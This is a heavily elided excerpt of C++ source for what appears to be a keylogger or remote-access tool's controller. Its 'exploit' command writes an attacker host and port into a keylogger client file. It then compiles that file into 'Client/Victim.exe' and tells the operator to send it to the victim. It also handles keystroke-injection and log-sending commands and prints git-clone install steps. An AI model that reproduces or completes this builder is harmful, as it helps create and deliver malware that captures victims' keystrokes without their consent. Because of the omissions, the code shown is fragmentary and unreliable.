...
void ExecuteCommand(char *cmd)
{
	...
	else if (strcmp(cmd, "exploit") == 0)
	{
		...
		else
		{
			if (editFile(lhost, lport) == 0)
			{
			 ...
			 strstr(cmd, "keyboard_send") || strstr(cmd, "keyevent") || strstr(cmd, "sendlog"))
	{
		if (!isSession)
		{
	...
	else if (strcmp(cmd, "install_cmd") == 0)
	{
		...
		cout << "git clone https://github.com/BluePhoenixxx/PTITHCM_TTCS_NHOM1.git\n";
		cout << "cd mingw-w64\n";
...
int editFile(std::string lhost, std::string lport)
{
	...
	keyscanFile.open("Client/keyscan.cpp", ios::in);
	tmpFile.open("Client/tmp.cpp", ios::out);
	...
	int code;
#if defined(_WIN32)
	code = system("g++ Client/tmp.cpp -o Client/Victim.exe -lws2_32");
#else
	code = system("i686-w64-mingw32-g++ Client/tmp.cpp -lws2_32 -static-libgcc -static-libstdc++ -o Client/Victim.exe");
#endif
	if (code == 0)
	{
		cout << "The Client/Victim.exe file has to be send to the victim\n";
